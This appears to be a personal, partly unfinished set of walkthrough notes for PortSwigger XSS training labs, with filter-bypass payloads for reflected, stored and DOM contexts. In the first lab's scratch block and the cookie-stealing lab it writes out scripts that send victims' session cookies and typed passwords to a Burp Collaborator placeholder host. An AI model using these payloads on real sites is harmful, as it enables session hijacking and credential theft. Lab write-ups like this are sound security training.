# XSS

### [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

Goal: perform a cross-site scripting attack that calls the `alert` function.

- just try the basic `xss` payload `<script>alert(1)</script>`

  ```bash
  ?search=<script>alert%28"XSS"%29<%2Fscript>
  ```

  ```
  <script>alert(document.cookie)</script>
  <img src=1 onerror=alert(1)>
  
  <script>
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body:document.cookie
  });
  </script>
  
  
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
  });">
  
  
  <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
  
  
  https://0a450003049df566c03104d1000d000d.web-security-academy.net/?search=%27%20opo%20po<body%20onresize>p%20%27
  ```

  



---

### [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

Goal: submit a comment that calls the `alert` function when the blog post is viewed.

- go to any post and write any basic `xss` payload 
  ```
  <script>alert(document.cookie)</script>
  OR
  <img src=1 onerror=alert(1)>
  ```

- Enter a name, email and website.

- Click "Post comment".



---

### [DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)







---

### [Lab: DOM XSS in `innerHTML` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)















---

### [DOM XSS in jQuery anchor `href` attribute sink using `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)















---

### [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)















---

### [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

Goal: perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

- Submit a random alphanumeric string in the search box.
- Observe that the random string has been reflected inside a quoted attribute.
- whatever you seach for , will reflect in the value attribute in the input tag
- you need to close the double quote of the value attribute , write new attribute to call the alert function and finally write any attribute `x="` with  double quote to close the input tag correctly `">`

<img src=".\xss_img\4_1.png" style="zoom:80%;" />

- 
  ```bash
  ?search=" onfocus=alert(1) autofocus x="
  ```

  











---

### [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

Goal: submit a comment that calls the `alert` function when the comment author name is clicked.

- Post a comment with a random alphanumeric string in the "Website" input.

- Observe that the random string has been reflected inside an anchor `href` attribute.

- Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert:

  ```json
  javascript:alert(1)
  ```

  <img src="C:\Users\dell\Desktop\xss_img\5_1.png" style="zoom:80%;" />











---

### [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

Goal : perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

- Submit a random alphanumeric string in the search box.
- Observe that the random string has been reflected inside a JavaScript string.

<img src=".\xss_img\8_1.png" style="zoom:80%;" />

- Replace your input with the following payload to break out of the JavaScript string and inject an alert:

  ```bash
  ?search=123'; -alert(1)-'
  ```

  













---

### [DOM XSS in `document.write` sink using source `location.search` inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

















---

### [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

















---

### [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)



















---

### [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

















---

### [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

Goal: exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

- go to the Burp menu, and launch the [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client).

- Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. 

- Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:

  ```
  <script>
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body:document.cookie
  });
  </script>
  ```

  This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.

- Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. 

- Take a note of the value of the victim's cookie in the POST body.

<img src=".\xss_img\1_1.png" style="zoom:70%;" />

- Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab.

---

### [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

Goal: exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.





---

### [Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)





---

### [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

Goal:  perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the WAF and calls the `print()` function.

- go to any post and write any basic

- I tried many `xss` payloads manually but I was got `400` Bad request with message `"Tag is not allowed"` 

  ```
  <script>alert(document.cookie)</script>
  OR
  <img src=1 onerror=alert(1)>
  ```

- I wanted to know which tag is allowed so, i sent the request to intruder 

- click "Clear §". Replace the value of the search term with: `<>`

- Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`

- Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".

- In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".

- When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `body` payload, which caused a 200 response

<img src=".\xss_img\2_1.png" style="zoom:80%;" />

- then I wanted to know which event is allowed 

- Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "copy events to clipboard".

- In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".

- When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `onresize` payload, which caused a 200 response.

  <img src=".\xss_img\2_2.png" style="zoom:80%;" />

- Go to the exploit server and paste the following code, replacing `your-lab-id` with your lab ID:

  ```html
  <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
  ```

- Click "Store" and "Deliver exploit to victim".

once the `iframe` is loaded in the page its width will be 100 px . the change in width will cause `onresize` to be called 



---

### [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

Goal: perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a custom tag and automatically alerts `document.cookie`.

- from lab description you know that all html tags are blocked ,so you need a custom html tag

- Go to the exploit server and paste the following code, replacing `your-lab-id` with your lab ID:

  ```html
  <script>
  location="https://your-lab-id.web-security-academy.net/?search=<karim id=x onfocus=alert(document.cookie) tabindex=1>test</karim>#x";
  </script>
  ```

- Click "Store" and "Deliver exploit to victim".

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. 

The **`tabindex`** indicates that its element can be focused.

The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called because from lab description you have to trigger the alert function automatically.

you can replace the hash part with `autofocus` event .

```
<script>
location="https://your-lab-id.web-security-academy.net/?search=<karim id=x onfocus=alert(document.cookie) tabindex=1 autofocus>test</karim>";
</script>
```



---

### [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

Goal:  perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert()` function.

- go to any post and write any basic

- I tried many `xss` payloads manually but I was got `400` Bad request with message `"Tag is not allowed"` 

  ```
  <script>alert(document.cookie)</script>
  OR
  <img src=1 onerror=alert(1)>
  ```

- I wanted to know which tag is allowed so, i sent the request to intruder 

- click "Clear §". Replace the value of the search term with: `<>`

- Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`

- Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".

- In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".

- When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `<svg>, <animatetransform>, <title>, and <image>` tags, which caused a 200 response

<img src=".\xss_img\3_1.png" style="zoom:80%;" />

- Go back to the Positions tab in Burp Intruder and replace your search term with:

  ```html
  <svg><animatetransform%20=1>
  ```

- Place the cursor before the `=` character and click "Add §" twice to create a payload position. The value of the search term should now be:

  ```html
  <svg><animatetransform%20§§=1>
  ```

- Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy events to clipboard".

- In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".

- When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `onbegin` payload, which caused a 200 response.

<img src=".\xss_img\3_2.png" style="zoom:80%;" />



- the final payload is

```html
<svg><animatetransform onbegin=alert(1)></svg>
```











---

### [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

Goal:  perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack on the home page that injects an attribute that calls the `alert` function.

- the lab link reflects in the canonical link , so you need to inject [accesskey](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey) attribute 

- from lab description , you know that the user will press the following key combinations:

  - `ALT+SHIFT+X`
  - `CTRL+ALT+X`
  - `Alt+X`

- you need to close the `href` attribute with a single qoute `'` then, inject the `accesskey` finally the alert function that will call when the user clicks `Alt+X`

- ```bash
  ?%27accesskey=%27X%27onclick=%27alert(1)
  OR
  ?'accesskey='X'onclick='alert(1)
  ```

  

<img src=".\xss_img\6_1.png" style="zoom:80%;" />









---

### [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

Goal: perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

- Submit a random alphanumeric string in the search box.
- Observe that the random string has been reflected inside a JavaScript string.

<img src=".\xss_img\7_1.png" style="zoom:80%;" />

- Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
  ```bash
  123' => 123\'
  
  123\ => 123\\
  ```

  

- Replace your input with the following payload to break out of the script block and inject a new script:

  ```html
  </script><img src=1 onerror=alert(1)>
  ```

  











---

### [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

Goal: perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

- Submit a random alphanumeric string in the search box.
- Observe that the random string has been reflected inside a JavaScript string.
- Try sending the payload `123>'` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string and `>` encoded into HTML encoding .

<img src=".\xss_img\9_1.png" style="zoom:80%;" />

- Replace your input with the following payload to break out of the JavaScript string and inject an alert:

  ```bash
  ?search=123\'; alert(1); //
  ```

- the first `\` will escape the  backslash-escaped for the single quote `\'` => `\\'`
  `;` to end the `var` 
  `//` to make any thing after `alert(1);` as a comment 













---

### [Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

Goal:  submit a comment that calls the `alert` function when the comment author name is clicked.

- Post a comment with a random alphanumeric string `http://123.com`  in the "Website" input.
- Observe that the random string  has been reflected inside an `onclick` event handler attribute.

<img src=".\xss_img\10_1.png" style="zoom:80%;" />

- Repeat the process again but this time modify your input to inject a JavaScript URL that calls `alert`, using the following payload:

  ```
  http://123.com;&apos;);alert(1);//
  ```

- The `&apos;` sequence is an HTML entity representing an apostrophe or single quote `'` . Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

  

<img src=".\xss_img\10_2.png" style="zoom:90%;" />









---

### [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

Goal: perform a cross-site scripting attack that calls the `alert` function inside the template string.

- Submit a random alphanumeric string in the search box.
- Observe that the random string has been reflected inside a JavaScript template string.

<img src=".\xss_img\11_1.png" style="zoom:80%;" />

- Replace your input with the following payload to execute JavaScript inside the template string: `${alert(1)}`
  ```bash
  ?search=123${alert(1)}
  ```

  









---

### [Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

Goal:  perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.





